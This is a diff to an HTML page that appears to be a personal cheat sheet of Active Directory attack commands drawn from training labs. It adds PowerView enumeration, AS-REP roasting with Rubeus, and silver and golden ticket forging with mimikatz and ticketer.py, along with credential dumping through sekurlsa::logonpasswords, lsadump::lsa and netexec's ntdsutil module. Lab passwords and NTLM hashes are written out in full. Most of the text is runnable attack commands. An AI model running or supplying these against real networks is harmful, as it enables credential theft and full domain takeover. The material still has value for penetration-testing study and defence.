@@ -42,6 +42,19 @@ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-us
 python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU #Enum members privileged-users
 python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -u #Enum specific user</code></pre>
             
+            <h3>PowerView</h3>
+            <ul>
+                <p>Once you have deployed PowerView.ps1 in the target machine there are a few commands that may come handy</p>
+                <pre><code class="language-powershell">Get-NetUser  #Display all domain users 
+Get-NetGroup #Display all domain groups
+Get-NetComputer #Display all domain computers
+Find-LocalAdminAccess #Find computers where your user has admin privileges
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104  #Convert SID to username
+Find-DomainShare #Find shares in the domain
+</code></pre>
+            </ul>
+            
+
             <h3>User enumeration</h3>
             <ul>
                 <p>User enumeration via ldapsearch </p>
@@ -284,12 +297,15 @@ print $0 ":" p[i]}' passwords.txt users.txt > combos.txt</code></pre>
                         <pre><code class="language-bash">hashcat --show -m 18200 hash</code></pre>
                         <p>Command in powershell in case you have access to the DC. Remember to use powerview.ps1</p>
                         <pre><code class="language-bash">Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</code></pre>
+                        <h4>From windows</h4>
+                        <p>We can do the same process but from windows by using rubeus</p>
+                        <pre><code class="language-powershell">.\Rubeus.exe asreproast /nowrap</code></pre>
                     </ul>
                     <h3>Kerberoasting Attack</h3>
                     <ul>
                         <p>Allows an authenticated attacker to acquire tickets TGS of service accounts in the domain.</p>
                         <pre><code class="language-bash">impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request
-impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request-user USERNAME</code></pre>
+impacket-GetUserSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request-user USERNAME</code></pre>
                         <p>In case you are targeting a user in another domain you could do</p>
                         <pre><code class="language-bash">impacket-GetUserSPNs  -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request</code></pre>
                         
@@ -322,6 +338,26 @@ impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request-user 
                     <ul>
                         <h3>Silver Ticket Attack 💿</h3>
                         <ul>
+                            <h4>From Windows</h4>
+                            <ul>
+                                <p>Once you have acquired admin access to a computer of the domain we could be able to forge a ticket for a user which we don't know its passwrd. This is called silver ticket attack</p>
+                                <p>To do so we need several things: SID of the domain, NTLM of the victim user.</p>
+                                <p>First use mimikatz in order to obtain the NTLM hash of the victim</p>
+                                <pre><code class="language-cmd">privilege::debug
+sekurlsa::logonpasswords</code></pre>
+                                <p>Now obtain the SID of the victim bu using <b>whoami /user</b> remember that this will give the SIUD which is the one that corresponds to your user. Meaning we need to remove the last part of that number. Example:</p>    
+                                <pre><code class="language-cmd">whoami /user
+S-1-5-21-1987370270-658905905-1781884369-1105  #This will be the result, now remove the last part which correspond to the user identifyer
+S-1-5-21-1987370270-658905905-1781884369</code></pre>   
+                                <p>Finally use mimikatz to forge the ticket using the corresponding data</p>
+                                <pre><code class="language-cmd">mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:YOUR_CURRENT_USER</code></pre>      
+                                <p>Now you can use <b>klist</b> to check if the ticket was loaded in memory</p>
+                                <p>And also access the http server which you coudn't with out the new ticket</p>
+                                <pre><code class="language-cmd">iwr -UseDefaultCredentials http://web04</code></pre>      
+                            </ul>
+                            
+                            <h4>From Linux</h4>
+                            <ul>
                             <p>Can be performed when an attack gains the NTLM hash of a service account of a SPN (SQL_SVC, svc_exchange...)</p>
                             <p>With that key we can create a TGS for that service</p>
                             <p>But, the ticket is false and is firmed using the key of the service therefor the service accepts as a valid ticket eventhough the ticket has no passed through the KDC</p>
@@ -343,34 +379,61 @@ IT</code></pre>
                             <pre><code class="language-bash"> export KRB5CCNAME=/home/kali/Downloads/IT.ccache</code></pre>
                             <p>Login using the ticket exported</p>
                             <pre><code class="language-bash">mssqlclient.py dc01.signed.htb -k</code></pre>
+                            </ul>    
+                                
+                        
                         </ul>
 
                         <h3>Golden Ticket Attack 📀</h3>
                         <ul>
+                            <p>Returning to the explanation of Kerberos authentication, we'll recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is the password hash of a domain user account called krbtgt.
+If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.</p>
                             <p>In order to perform this attack you'll need</p>
                             <p>KRBTGT Account's NTLM Hash</p>
-                            <p>Obviusly you need domain admin on that server to acquire it</p>
+                            <p>This can be obtained using mimikatz</p>
+                            <pre><code class="language-bash">lsadump::lsa /patch</code></pre>    
+                            <p>Or if you have domain admin privileges</p>        
                             <pre><code class="language-bash">secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></pre>
                             <br>
 
-                            <b>Domain SID</b>
-                            <pre><code class="language-bash">lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code></pre>
-
-                            <b>SID of the Admins group</b>
+                            <h4>Domain SID</h4>
+                            
+                            <ul>
+                                <pre><code class="language-bash">lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+whoami /user  #Alternative way</code></pre>
+                            </ul>
+                            <br>
+                            <h4>SID of the Admins group</h4>
+                            <ul>
                             <p>Think that the Enterpise Admins group is only in the root domain so from child domains you won't be able to get it. It is recommended to get it from Windows or by using rpcclient</p>
                             <p>In case your credentials are not valid in the DC you won't be able to login</p>
                             <pre><code class="language-bash">ldapsearch -x -H ldap://inlanefreight.local 
 -D "htb-student_adm@inlanefreight.local" -w HTB_@cademy_stdnt_admin! 
 -b "dc=inlanefreight,dc=local" "(cn=Enterprise Admins)" objectSid</code></pre>
+                            </ul>    
+                            
+                            <h4>Attack using mimikatz</h4>
+                            <ul>
+                                <pre><code class="language-bash">kerberos::purge  #Clean the cache 
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt  #Create the ticket and load it in memory
+PsExec.exe \\dc1 cmd.exe   #Use the </code></pre>
+                            </ul>    
+
+                            <h4>Attack using ticketer</h4>
+                            <ul>
                             <p>Finally perform the attack using ticketer.py</p>
                             <pre><code class="language-bash">ticketer.py -nthash 9d765b482771505cbe97411065964d5f 
 -domain-sid DOMAIN_SID -domain logistics.inlanefreight.local -extra-sid SID_OF_ADMINS_GROUP hacker
 export KRB5CCNAME=/tmp/hacker.ccache
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 </code></pre>
-                            <b>You can also use this atopwn tool to automate the attack</b>
-                            <pre><code class="language-bash">raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></pre>
-                            <p>Since you won't be able to do something when you get the shell i recommend you to dump the NTDS.dit</p>
-                            <pre><code class="language-bash">netexec smb 172.16.5.5 -u Administrator -H 88ad09182de639ccc6579eb0849751cf -M ntdsutil</code></pre>
+                            </ul>
+                            
+                            <h4>Attack using raiseChild.py</h4>
+                            <ul>                            <b>You can also use this atopwn tool to automate the attack</b>
+                                <pre><code class="language-bash">raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></pre>
+                                <p>Since you won't be able to do something when you get the shell i recommend you to dump the NTDS.dit</p>
+                                <pre><code class="language-bash">netexec smb 172.16.5.5 -u Administrator -H 88ad09182de639ccc6579eb0849751cf -M ntdsutil</code></pre>
+                            </ul>
                         </ul>
 
                         <h3>Diamon Ticket Attack 🔷</h3>
